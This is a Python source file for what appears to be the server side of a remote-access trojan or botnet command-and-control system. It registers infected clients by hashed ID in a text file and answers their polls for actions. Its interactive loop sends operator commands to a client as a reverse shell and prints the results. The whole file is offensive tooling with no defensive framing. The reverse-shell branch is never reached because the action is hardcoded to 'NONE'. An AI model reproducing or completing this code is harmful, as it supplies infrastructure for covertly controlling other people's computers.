import json
import asyncio

def open_shell_interpreter(conn):
	cmd = ""
	while True:
		cmd = raw_input(">")
		if cmd == "exit":
			conn.send(cmd.encode())
			break
		else:
			try:
				conn.send(cmd.encode())
				print(conn.recv(1024))
			except:
				break

def check_client_action(conn, data, data_processed):
	print("[i] %s is checking for actions.." % data_processed['client_hashed_id'])
	action = "NONE"
	if action == "reverse_shell":
		conn.send(action.encode())
		open_shell_interpreter(conn)
	else:
		conn.send(action.encode())

def register_client(conn, data, data_processed):
	print("[i] Registering new client.. %s" % data_processed["client_hashed_id"])
	clients_file = open("clients.txt", "a")
	clients_file.write(data.decode())
	clients_file.close()
	print("[S] Client successfully registered.")
	conn.send(b"OK")

def handle_connection(conn, addr):
    print('[i] New connection from %s %s' % (addr[0], addr[1]))
    while True:
        data = conn.recv(1024)
        if not data:
            break
        print(data.decode())
        data_processed = json.loads(data.decode())
        if(data_processed["action"]) == "register":
            register_client(conn, data, data_processed)
        if(data_processed["action"]) == "checkAction":
            check_client_action(conn, data, data_processed)
    conn.close()
    print("[i] Client disconnected.\n")